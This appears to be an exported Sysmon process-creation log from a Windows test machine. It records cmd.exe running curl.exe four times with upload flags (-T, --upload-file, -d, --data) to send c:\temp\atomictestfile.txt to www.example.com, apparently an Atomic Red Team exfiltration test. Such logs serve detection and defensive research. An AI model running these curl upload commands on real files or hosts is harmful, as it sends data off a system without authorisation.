Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com,"curl, https://curl.se/",WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,The curl executable,1,19620,8.4.0,"MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2",C:\Windows\System32\curl.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:11.050

ProcessGuid: {f57bd86a-8d4f-658c-f101-000000000f00}

ProcessId: 8564

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User",Info,curl.exe,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com",C:\Windows\System32\cmd.exe,{f57bd86a-8d4e-658c-ec01-000000000f00},10268,WINDEV2309EVAL\User,,{f57bd86a-8d4f-658c-f101-000000000f00},3588,8564,The curl executable,,,,"
      ",-,2023-12-27T20:47:11.0516016Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:11.050,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:11.0516016Z""/>
      <EventRecordID>19620</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:11.050</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4f-658c-f101-000000000f00}</Data>
      <Data Name=""ProcessId"">8564</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""FileVersion"">8.4.0</Data>
      <Data Name=""Description"">The curl executable</Data>
      <Data Name=""Product"">The curl executable</Data>
      <Data Name=""Company"">curl, https://curl.se/</Data>
      <Data Name=""OriginalFileName"">curl.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4e-658c-ec01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10268</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:11.050

ProcessGuid: {f57bd86a-8d4f-658c-f101-000000000f00}

ProcessId: 8564

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com ,"curl, https://curl.se/",WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,The curl executable,1,19619,8.4.0,"MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2",C:\Windows\System32\curl.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.608

ProcessGuid: {f57bd86a-8d4e-658c-f001-000000000f00}

ProcessId: 3264

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User",Info,curl.exe,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com",C:\Windows\System32\cmd.exe,{f57bd86a-8d4e-658c-ec01-000000000f00},10268,WINDEV2309EVAL\User,,{f57bd86a-8d4e-658c-f001-000000000f00},3588,3264,The curl executable,,,,"
      ",-,2023-12-27T20:47:10.6090938Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.608,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.6090938Z""/>
      <EventRecordID>19619</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.608</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-f001-000000000f00}</Data>
      <Data Name=""ProcessId"">3264</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""FileVersion"">8.4.0</Data>
      <Data Name=""Description"">The curl executable</Data>
      <Data Name=""Product"">The curl executable</Data>
      <Data Name=""Company"">curl, https://curl.se/</Data>
      <Data Name=""OriginalFileName"">curl.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4e-658c-ec01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10268</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.608

ProcessGuid: {f57bd86a-8d4e-658c-f001-000000000f00}

ProcessId: 3264

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com ,"curl, https://curl.se/",WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,The curl executable,1,19618,8.4.0,"MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2",C:\Windows\System32\curl.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.593

ProcessGuid: {f57bd86a-8d4e-658c-ef01-000000000f00}

ProcessId: 8676

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User",Info,curl.exe,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com",C:\Windows\System32\cmd.exe,{f57bd86a-8d4e-658c-ec01-000000000f00},10268,WINDEV2309EVAL\User,,{f57bd86a-8d4e-658c-ef01-000000000f00},3588,8676,The curl executable,,,,"
      ",-,2023-12-27T20:47:10.5948506Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.593,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.5948506Z""/>
      <EventRecordID>19618</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.593</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-ef01-000000000f00}</Data>
      <Data Name=""ProcessId"">8676</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""FileVersion"">8.4.0</Data>
      <Data Name=""Description"">The curl executable</Data>
      <Data Name=""Product"">The curl executable</Data>
      <Data Name=""Company"">curl, https://curl.se/</Data>
      <Data Name=""OriginalFileName"">curl.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4e-658c-ec01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10268</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.593

ProcessGuid: {f57bd86a-8d4e-658c-ef01-000000000f00}

ProcessId: 8676

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com ,"curl, https://curl.se/",WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,The curl executable,1,19617,8.4.0,"MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2",C:\Windows\System32\curl.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.579

ProcessGuid: {f57bd86a-8d4e-658c-ee01-000000000f00}

ProcessId: 3260

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User",Info,curl.exe,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com",C:\Windows\System32\cmd.exe,{f57bd86a-8d4e-658c-ec01-000000000f00},10268,WINDEV2309EVAL\User,,{f57bd86a-8d4e-658c-ee01-000000000f00},3588,3260,The curl executable,,,,"
      ",-,2023-12-27T20:47:10.5804148Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:10.579,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:10.5804148Z""/>
      <EventRecordID>19617</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:10.579</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d4e-658c-ee01-000000000f00}</Data>
      <Data Name=""ProcessId"">3260</Data>
      <Data Name=""Image"">C:\Windows\System32\curl.exe</Data>
      <Data Name=""FileVersion"">8.4.0</Data>
      <Data Name=""Description"">The curl executable</Data>
      <Data Name=""Product"">The curl executable</Data>
      <Data Name=""Company"">curl, https://curl.se/</Data>
      <Data Name=""OriginalFileName"">curl.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4e-658c-ec01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10268</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.579

ProcessGuid: {f57bd86a-8d4e-658c-ee01-000000000f00}

ProcessId: 3260

Image: C:\Windows\System32\curl.exe

FileVersion: 8.4.0

Description: The curl executable

Product: The curl executable

Company: curl, https://curl.se/

OriginalFileName: curl.exe

CommandLine: C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2

ParentProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ParentProcessId: 10268

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com &amp; C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19616,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:10.556

ProcessGuid: {f57bd86a-8d4e-658c-ec01-000000000f00}

ProcessId: 10268

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

